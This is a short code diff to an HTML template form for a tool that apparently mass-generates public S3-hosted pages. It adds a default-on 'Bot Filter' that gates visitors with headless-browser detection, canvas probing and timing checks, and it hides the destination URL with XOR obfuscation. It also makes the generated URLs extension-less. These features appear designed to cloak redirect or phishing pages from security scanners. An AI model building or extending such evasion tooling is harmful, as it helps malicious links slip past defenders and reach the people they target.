@@ -115,9 +115,13 @@
                 <option value="{{ r }}">{{ r }}</option>
                 {% endfor %}
             </select>
+            <label style="display:flex;align-items:center;gap:6px;margin-top:8px;font-weight:400;cursor:pointer">
+                <input type="checkbox" name="bot_filter" value="1" checked style="margin:0;width:auto">
+                <span>Bot Filter</span>
+                <span style="font-size:11px;color:var(--fg2)">JS-based anti-bot gate (headless detection, canvas probe, timing check). Destination URL is XOR-obfuscated.</span>
+            </label>
             <div class="form-help" style="margin-top:6px">
-                Creates one fresh public bucket per generation; URLs are path-style
-                <code>https://s3.{region}.amazonaws.com/{bucket}/{key}.html</code>.
+                URLs are extension-less path-style: <code>https://s3.{region}.amazonaws.com/{bucket}/{key}</code>.
             </div>
             <div style="margin-top:10px"><button class="btn btn-primary" {% if not s3_configured %}disabled{% endif %}>Generate S3 Links</button></div>
         </form>
